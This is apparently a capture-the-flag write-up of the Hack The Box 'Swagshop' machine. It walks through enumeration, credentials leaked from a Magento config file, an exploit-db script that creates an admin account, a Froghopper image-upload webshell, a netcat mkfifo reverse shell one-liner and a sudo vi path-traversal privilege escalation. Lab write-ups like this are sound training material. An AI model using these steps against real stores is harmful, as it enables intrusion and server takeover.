# Swapshop:
## Nmap scan:
* Performed an nmap scan and the results are shown below:
```c
# Nmap 7.70 scan initiated Mon Sep 16 12:36:07 2019 as: nmap -sC -sV -oA nmap 10.10.10.140
Nmap scan report for 10.10.10.140
Host is up (0.29s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Home page
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Sep 16 12:41:32 2019 -- 1 IP address (1 host up) scanned in 325.34 seconds
```
## Services opened:
* The nmap scan reveals that ssh (port 22) as well as http (port 80) is open.

### HTTP:
* Navigating to the HTTP service running on port 80, I discovered a magento web shop hosting various hack the box products. 
* To enumerate the various directories belonging to the web service, I executed the dirsearch script which yielded the following results:
```c
[13:37:56] 301 -  310B  - /app  ->  http://10.10.10.140/app/
[13:37:57] 200 -    5KB - /app/etc/config.xml
[13:37:57] 200 -    9KB - /app/etc/local.xml.additional
[13:37:57] 200 -    2KB - /app/etc/local.xml
[13:37:57] 200 -    2KB - /app/etc/local.xml.template
[13:38:21] 200 -  717B  - /cron.sh
[13:38:21] 200 -    0B  - /cron.php
[13:38:32] 301 -  313B  - /errors  ->  http://10.10.10.140/errors/
[13:38:32] 200 -    2KB - /errors/
[13:38:34] 200 -    1KB - /favicon.ico
[13:38:46] 200 -  946B  - /includes/
[13:38:46] 301 -  315B  - /includes  ->  http://10.10.10.140/includes/
[13:38:48] 200 -   16KB - /index.php
[13:38:50] 200 -   44B  - /install.php
[13:38:52] 301 -  309B  - /js  ->  http://10.10.10.140/js/
[13:38:53] 301 -  318B  - /js/tiny_mce  ->  http://10.10.10.140/js/tiny_mce/
[13:38:53] 200 -    4KB - /js/tiny_mce/
[13:38:54] 301 -  310B  - /lib  ->  http://10.10.10.140/lib/
[13:38:55] 200 -   10KB - /LICENSE.txt
[13:39:03] 301 -  312B  - /media  ->  http://10.10.10.140/media/
[13:39:18] 200 -  886B  - /php.ini.sample
[13:39:25] 301 -  314B  - /pkginfo  ->  http://10.10.10.140/pkginfo/
[13:39:35] 200 -  571KB - /RELEASE_NOTES.txt
[13:39:36] 403 -  300B  - /server-status
[13:39:36] 403 -  301B  - /server-status/
[13:39:38] 200 -    2KB - /shell/
[13:39:38] 301 -  312B  - /shell  ->  http://10.10.10.140/shell/
[13:39:42] 301 -  311B  - /skin  ->  http://10.10.10.140/skin/
[13:40:00] 200 -  755B  - /var/backups/
[13:40:00] 301 -  310B  - /var  ->  http://10.10.10.140/var/
[13:40:00] 200 -    4KB - /var/cache/
```
* The XML files are quite interesting as well as /shell.
* The XML files contain some database credentials for MySql. Attempting to use these credentials to log into ssh or the admin panel at /index.php/admin was not successful. 
* The interesting parts of /app/etc/local.xml are shown below:
```xml
<connection>
  <host>
    <![CDATA[ localhost ]]>
  </host>
  <username>
    <![CDATA[ root ]]>
  </username>
  <password>
    <![CDATA[ fMVWh7bDHpgZkyfqQXreTjU9 ]]>
  </password>
  <dbname>
    <![CDATA[ swagshop ]]>
  </dbname>
  <initStatements>
    <![CDATA[ SET NAMES utf8 ]]>
  </initStatements>
  <model>
    <![CDATA[ mysql4 ]]>
  </model>
  <type>
    <![CDATA[ pdo_mysql ]]>
```

### Admin panel:
* The admin panel is located at /index.php/admin.
* Credentials are needed and brute forcing as suggested by a source is probably not going to lead anywhere.
* I managed to find an exploit that might or might not work.
* [Magento eCommerce - Remote Code Execution - XML webapps Exploit](https://www.exploit-db.com/exploits/37977)
* Downloading the script and then modifying the target to http://10.10.10.140/index.php surprisingly worked and created an admin panel account with the following credentials forme:forme.

### Image upload vulnerability:
* Once I acquired access to the admin panel, I tampered around with the settings to see what could be changed.
* I found an online guide detailing a froghopper exploit that could be performed against Magento's newsletter templating system to be able to upload images with malicious PHP code embedded inside. 
* [Anatomy Of A Magento Attack: Froghopper](https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper)
* To be able to perform this attack, I had to follow the steps below:
  1. Need to enable symlinks so that php code appended to images get executed. Found under System/developer/template settings
  2. Upload an image with php code at the end into a category.
  3. Create a newsletter template.
  4. Preview newsletter template.

### Webshell:
* Once the newsletter template is previewed, we will have a webshell that we can use. 
* A reverse shell to our terminal is preferred so we can receive errors from our commands. 
* To acquired a reverse shell, we run the following commands on the local machine:
```c
  nc -lvp 1234
``````
* And run the following on the webshell:
```c
  rm /tmp/f
  mkfifo /tmp/f
  cat /tmp/f | /bin/sh -i 2>&1 | nc [server ip] [server port] > /tmp/f
```

## Obtaining user.txt:
* Navigate to /home/haris and open user.txt.

## Privilege escalation:
* Running:
```c
  $ sudo -l
  Matching Defaults entries for www-data on swagshop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*
```

* This means we can use vi without entering a password as long as we are trying to open a file somewhere in the /var/www/html directory. 
* Changing directory into this path will not work since the path "/var/www/html" needs to be in the file argument that is passed into vi.
* e.g 
```c
  $ sudo vi /var/www/html/index.php
```
* Note that we can change directories using '../' so using this technique, we tweak our vi command to open '/root/root.txt'.
* Command:
```c
  $ sudo vi /var/www/html/../../../root/root.txt
```
* The flag for root is inside root.txt and the box is pwned!

### Tips:
1. Turn off host firewall otherwise reverse shell will not work.